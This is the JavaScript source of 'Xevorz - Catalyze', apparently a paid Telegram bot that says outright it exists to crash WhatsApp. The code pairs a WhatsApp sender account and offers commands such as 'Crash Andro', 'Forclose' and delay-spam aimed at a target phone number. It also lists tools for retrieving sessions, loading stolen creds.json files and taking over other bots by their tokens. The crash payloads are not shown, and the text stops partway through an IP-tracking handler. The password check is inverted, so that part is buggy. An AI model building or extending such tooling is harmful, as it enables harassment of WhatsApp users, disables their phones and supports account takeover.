const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const { TOKEN_BOT } = require("./settings/config");
const crypto = require("crypto");
const premiumFile = "./database/premium.json";
const adminFile = "./database/admin.json";
const ownerFile = "./database/owner.json";
const sessionPath = './xevorzsession';
const Module = require('module');
const vm = require('vm');
const fetch = require('node-fetch');
const originalRequire = Module.prototype.require;
let bots = [];

const bot = new Telegraf(TOKEN_BOT);

// ~ thumbnailurl ~ \\
const thumbnailurl = "https://litter.catbox.moe/a6hyhq7ho70scz0j.jpg";
const thumbnailUrl = fs.readFileSync('./assets/⚘. Xevorz - Catalyze 「 ཀ 」.jpg');

bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let lastPairingMessage = null;
let linkedWhatsAppNumber = "";
const usePairingCode = true;

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

// ~ Runtime ~ \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Days, ${hours} Hours, ${minutes} Minutes, ${secs} Seconds`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

// ~ Coldown ~ \\
const cooldownFile = './assets/cooldown.json'
const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

// ~ Function Test Func ~ \\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// ~ Formated Date ~ \\
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

// ~ Ensure Database ~ \\
function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

// ~ Raw Github ~ \\
const databaseUrl =
  "https://raw.githubusercontent.com/Kenzzdev11/Kenzzdb/refs/heads/main/Tokens.json";


async function fetchValidTokens() {
  try {
    const response = await axios.get(databaseUrl);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red.bold("Gagal Saat Mengambil Data Dari Url", error.message));
    return [];
  }
}

async function validateToken() {
 try {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(TOKEN_BOT)) {
    console.log(chalk.bold.red(`
⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀
⣼⣿⣿⣿⢿⣿⣟⣿⣿⣻⣿⣟⡿⠿⢯⡿⠿⢿⣽⣿⣿⣻⣿⢿⣻⣿⣿⢿⣿⣧
⣿⣿⡿⣿⣿⣿⣻⣿⠿⠛⠉⠀⠀⢀⣴⣷⣀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣻⣿⣿⣿
⣿⣿⣿⣿⣿⣽⠟⠁⠀⠀⠀⢀⣴⣿⣿⣿⠟⠁⠀⡀⠀⠀⠈⠻⣿⣽⣿⡿⣟⣿
⣿⣿⡿⣷⣿⠃⠀⠀⠀⢀⣴⣿⣿⣿⠟⠁⠀⠀⣠⣷⣄⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⡀⠀⠘⢿⣿⣿⣿⣅⠀⠀⣠⣾⣿⣿⣿⣷⣄⠀⠀⠘⣿⣷⣿⣿
⣿⣿⣽⡟⠀⢠⣧⡀⠀⠀⠙⢿⣿⣿⣷⣾⣿⣿⡿⠻⣿⣿⣿⣷⣄⠀⢹⣿⣿⣻
⣿⣿⣿⡇⠰⣿⣿⣿⣦⡀⠀⠀⣹⣿⣿⣿⣿⣏⠀⠀⠈⠻⣿⣿⣿⡗⢸⣿⣿⣿
⣿⣿⣾⣧⠀⠈⢻⣿⣿⣿⣦⣾⣿⣿⡿⢿⣿⣿⣷⣄⠀⠀⠈⠻⠃⠀⣸⣿⣿⣽
⣿⣿⡿⣿⡄⠀⠀⠈⢻⣿⣿⣿⡿⠋⠀⠀⢙⣿⣿⣿⣷⡄⠀⠀⠀⢠⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠀⠀⠀⠈⠿⠋⠀⠀⢀⣴⣿⣿⣿⠿⠃⠀⠀⠀⢠⣿⣿⣿⣟⣿
⣿⣿⣿⣾⣿⣿⣦⡀⠀⠀⠀⠀⠀⣴⣿⣿⣿⡟⠋⠀⠀⠀⢀⣴⣿⣿⣿⡿⣿⣿
⣿⣿⣟⣿⣷⣿⣿⣿⣷⣤⣀⠀⠀⠈⠻⡟⠋⠀⠀⣀⣤⣾⣿⣿⣿⣿⡿⣿⣿⣿
⢻⣿⣿⢿⣻⣿⣯⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣻⣷⣿⣿⣟⡏
⠀⠙⠿⢿⣿⡿⣿⣿⣷⣿⢿⣿⢿⣿⡿⣿⣿⡿⣿⣿⣟⣯⣷⣿⣿⣿⣻⠯⠋⠀
Tokens Is Not Registered\nPlease Contact hanz In Telegram For Registration Tokens`));
          process.exit(1);
    }
     startBot()
  } catch (error) {
   console.error("Error:", error);
      process.exit(1);
  }
}

function startBot() {
  console.log(
    chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢤⠠⡔⣰⢂⡲⣄⠢⢄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠰⡇⢾⣬⣷⣽⣧⣿⣵⣾⠽⡎⡶⠡⠌⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠲⣢⢹⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠡⢘⣥⣻⢬⢻⣿⣿⣿⣿⣿⣿⣤⢿⣱⢷⢔⡀⠂⠄⠀⠀⠀⠀⠀⠀⠀⡈⡌⣰⣸⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⢂⡔⣧⣮⡾⣺⣗⣯⡿⠿⠿⠿⠾⣯⡽⣻⣭⡫⡻⣭⡘⠄⡀⠀⠀⠀⠀⠀⠁⠤⠍⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⡐⢡⢊⢮⣾⣻⣪⡮⠊⠁⠀⠀⠀⠀⠀⠀⠈⢓⡷⡙⣮⡪⡻⡰⣀⠔⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠐⢂⣏⢻⣏⠓⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢋⡟⣿⣾⣿⣇⡟⣉⣿⡖⢳⣾⣰⣶⣀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⡠⢐⡼⣮⢯⣝⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣾⣽⣿⣿⣿⣿⣿⣾⣯⢿⣿⣷⡯⠛⠤⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡡⢚⣯⣯⣿⣾⡧⠀⠆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⠿⡟⠟⠩⠁⠂⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⠟⢫⠙⠠⠁⠸⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠄⣠⣤⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣏⡉⡿⡈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢤⡚⡽⢿⢿⡿⣿⢿⡿⠿⠿⠿⠻⠯⠿⣿⣿⣯⣻⣿⠽⠟⠟⠛⠻⢛⡩⣵⡟⡢⣟⠏⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠂⠐⠀⠂⠀⠁⠈⠀⠁⠀⠂⠘⠫⣓⡷⡇⣿⣯⣴⣬⣿⡗⣟⣾⡿⡡⢊⠐⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠳⡝⣷⢾⢧⡷⣿⣿⠿⠉⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠃⡜⢚⠓⠃⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Token Valids ( 𖣂 )
Author : Vanzz𖣂
Thanks For Purchasing This Script
`));
}

validateToken();

// ~ Function Connect Whatsapp ~ \\
const WhatsAppConnect = async () => { 
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();
  const date = getCurrentDate();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

        if (connection === 'open') {
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>  
⬡ ターゲット : ${lastPairingMessage.phoneNumber}  
⬡ コードペアリング : ${lastPairingMessage.pairingCode}  
⬡ デイデイト : ${date}`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        console.log(e)
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            console.log(chalk.bold.white(`
⬡ メーカー: Vanzz𖣂
⬡ バージョン : 4.0.0
⬡ ペアステータス: `) + chalk.green.bold('WhatsApp Terhubung'));
        }
      if (connection === 'close') {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
        console.log(
        chalk.red('Koneksi WhatsApp terputus:'),
       shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                WhatsAppConnect();
      }
      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.replyWithHTML("<b>❌ Sender Not Connected\nPlease Using /connect</b>");
    return;
  }
  next();
};
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};



// ~ Delete Session ~ \\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}


let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// ~ Check Admin & Owner ~ \\
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
  return ctx.replyWithHTML("<blockquote>Owner Acces</blockquote>\n<b>Please Contact vanzz For Purchasing Admin Acces</b>");
       }
    next();
};

const checkOwnerOrAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString()) && !ownerUsers.includes(ctx.from.id.toString())) {
  return ctx.replyWithHTML("<blockquote>Owner & Admin Acces</blockquote>\n<b>Contact vanzz For Purchasing Admin Acces</b>");
       }
    next();
};


// ~ Check Premium ~ \\
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.replyWithHTML("<blockquote>Premium Acces</blockquote>\n<b>Please Contact vanzz For Purchasing Premium Acces</b>");
     }
    next();
};


// ~ Fungsi add Admin ~ \\
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};


// ~ Fungsi Delete Admin ~ \\
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};


// ~ Fungsi Simpan Admin ~ \\
const saveAdmins = () => {
  fs.writeFileSync("./database/admins.json", JSON.stringify(adminList));
};

// ~ Security Password ~ \\

const passwordUrl = "https://raw.githubusercontent.com/Kenzzdev11/Kenzzdb/refs/heads/main/key.json";
let passwordValidated = false;

// Middleware proteksi akses
bot.use((ctx, next) => {
    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!passwordValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 Masukkan password anda untuk mengaktifkan bot, Format: /start <password>"); } catch (e) {}
        }
        return ctx.reply("🔒 Akses terkunci ketik /start <password> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
  const runtime = getBotRuntime();
  const userId = ctx.from.id;
  const text = ctx.message?.text || "";
  const parts = text.trim().split(" ");
  const userPassword = parts[1] ? parts[1].trim() : "";
    
    if (!passwordValidated) {

      if (!userPassword) {
        return ctx.reply("🔑 Masukkan password yang diberikan oleh admin untuk diaktifkan, Format: /start <password>");
      }

      try {
        const res = await axios.get(passwordUrl);
        const password = (res.data && res.data.password) || [];
const botPassword = res.data.password;
        if (userPassword === botPassword) {
          return ctx.reply("❌ Password Salah");
        }

        passwordValidated = true;
        return ctx.reply("✅ Password Benar !!, ketik /start untuk membuka menu utama");
      } catch (e) {
        return ctx.reply("❌ Gagal memverifikasi token" + e);
      }
    }
    const menuMessage = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : Vanzz𖣂</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

<code>© Vanzz𖣂</code>`;


    const button = [
          [
           { text: "「 メ 」- °クラッシュさせ🦠🧬", callback_data: "trashshow" },
           { text: "「 メ 」- °ラッシュさせ🌺🔧", callback_data: "toolsmenu" },
          ],
          [
            { text: "「 メ 」- °シュさせ💫⚙️", callback_data: "settings" },
          ],
          [
            { text: "「 メ 」- °ュさせ🎱", callback_data: "thanksto" },
          ],
          [{ text: "𝟓𝟎𝟖 !", url: "https://t.me/Vanzzkiller" }],
        ];

    ctx.replyWithPhoto(thumbnailurl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: button
        }
    });
  await ctx.replyWithAudio(
    { source: fs.createReadStream("./assets/Xevorz 𖣂 Xzell ¿?.mp3") },
    {
      title: "Xevorz 𖣂 Catalyze ¡",
      caption: "Xevorz 𖣂 Catalyze ¡",
      performer: "Vanzz𖣂",
    }
  );
});

bot.action('start', async (ctx) => {
   if (!passwordValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("🔒 Masukkan password yang diberikan oleh admin\n\nFormat : /start <password>");
    }
    const runtime = getBotRuntime();
    const menuMessage = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : vanzz</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

<code>© Vanzz𖣂</code>`;

    const button = [
          [
           { text: "「 メ 」- °クラッシュさせ🦠🧬", callback_data: "trashshow" },
           { text: "「 メ 」- °ラッシュさせ🌺🏍", callback_data: "toolsmenu" },
          ],
          [
            { text: "「 メ 」- °シュさせ💫⚙️", callback_data: "settings" },
          ],
          [
            { text: "「 メ 」- °ュさせ🎱", callback_data: "thanksto" },
          ],
          [{ text: "𝟓𝟎𝟖 !", url: "https://t.me/Vanzzkiller" }],
        ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailurl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: button
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('back', async (ctx) => {
    const runtime = getBotRuntime();
    const menuMessage = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : Vanzz𖣂</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

<code>© Vanzz𖣂</code>`;

    const button = [  
          [
           { text: "「 メ 」- °クラッシュさせ🦠🧬", callback_data: "trashshow" },
           { text: "「 メ 」- °ラッシュさせ🌺🔧", callback_data: "toolsmenu" },
          ],
          [
            { text: "「 メ 」- °シュさせ💫⚙️", callback_data: "settings" },
          ],
          [
            { text: "「 メ 」- °ュさせ🎱", callback_data: "thanksto" },
          ],
          [{ text: "𝟓𝟎𝟖 !", url: "https://t.me/Vanzzkiller" }],
        ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailurl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: button
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('settings', async (ctx) => {
    const runtime = getBotRuntime();
    const controlsMenu = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : Vanzz𖣂</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

╭───⊱<b> ( 🍁 ) Controls° - Menu</b>
│⬡ /killsesi 
│╰┈➤ Delete Sessions
│⬡ /setcd 
│╰┈➤ Set Cooldown
│⬡ /connect 62xx
│╰┈➤ Add Sender Whatsapp
│⬡ /addadmin ID
│╰┈➤ Add Admin Users
│⬡ /deladmin ID
│╰┈➤ Delete Admin Users
│⬡ /addprem ID
│╰┈➤ Add Premium Users
│⬡ /delprem ID
│╰┈➤ Delete Premium Users
╰───────────────⊱
`;

    const button = [
        [
            {
                text: "「 メ 」- °Back !",
                callback_data: "back"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: button
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('toolsmenu', async (ctx) => {
    const runtime = getBotRuntime();
    const controlsMenu = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : Vanzz𖣂</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

╭───⊱<b> ( 🦄 ) Tools° - Menu</b>
│⬡ /csessions
│╰┈➤ Retrieving Sessions 
│⬡ /ssiphone
│╰┈➤ Ss Whatsapp Iphone
│⬡ /addsender [ Creds.json ]
│╰┈➤ Add Sender Creds.json
│⬡ /brat [ Text ]
│╰┈➤ Create Sticker Brat
│⬡ /enchtml [ Reply File ]
│╰┈➤ Lock Code HTML
│⬡ /getcode [ Link ]
│╰┈➤ Get HTML Code
│⬡ /trackip [ Ip Adresss ]
│╰┈➤ Check Ip Information
│⬡ /tiktokdl [ Url ]
│╰┈➤ Downloader Video Tiktok
│⬡ /tourl [ Reply Media ]
│╰┈➤ Convert Media To Link
│⬡ /rasukbot [ Token|Teks|Jumlah ]
│╰┈➤ To Rasuk Bot
╰───────────────⊱
`;

    const button = [
        [
            {
                text: "「 メ 」- °Back !",
                callback_data: "back"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: button
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('trashshow', async (ctx) => {
    const runtime = getBotRuntime();
    const bugMenu = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : Vanzz𖣂</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

╭───⊱<b> ( 🦠 ) Trash° - Menu</b>
│⬡ /tryfunc [ Reply Function ]
│╰┈➤ Test Function
│⬡ /Xvanx 62xx
│╰┈➤ Delay Bebas Spam
│⬡ /Andronew 62xx
│╰┈➤ Crash Andro
│⬡ /DelayArrow 62xx
│╰┈➤ Delay Message
│⬡ /ForceNew 62xx
│╰┈➤ Forclose Invis/visible
╰───────────────⊱
`;

    const button = [
        [
            {
                text: "「 メ 」- °Back !",
                callback_data: "back"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: button
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('thanksto', async (ctx) => {
    const runtime = getBotRuntime();
    const tqtoMenu = `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>
<b>─ 私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです。</b>

<b>ᯤ Name Script : Xevorz - Catalyze</b>
<b>ᯤ Author : Vanzz𖣂</b>
<b>ᯤ Version : Four - Apocalypse</b>
<b>ᯤ Username</b> : ${ctx.from.first_name}
<b>ᯤ Runtime : ${runtime}</b>

╭───⊱<b> ( 🫀 ) Thanks° - To</b>
│⬡ Vanzz𖣂 ( Developer) 
│⬡ Allah ( My God ) 
│⬡ Vanzz ( Dev ) 
│⬡ My Wife ( Support )
│⬡ Quits ( My Friend ) 
│⬡ My Family ( Suport )
│⬡ All Buyer ( My Atm ) 
│╰┈➤ Author
╰───────────────⊱
`;

    const button = [
        [
            {
                text: "「 メ 」- °Back !",
                callback_data: "back"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: button
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ~ Tools Menu ~ \\
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("❌ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
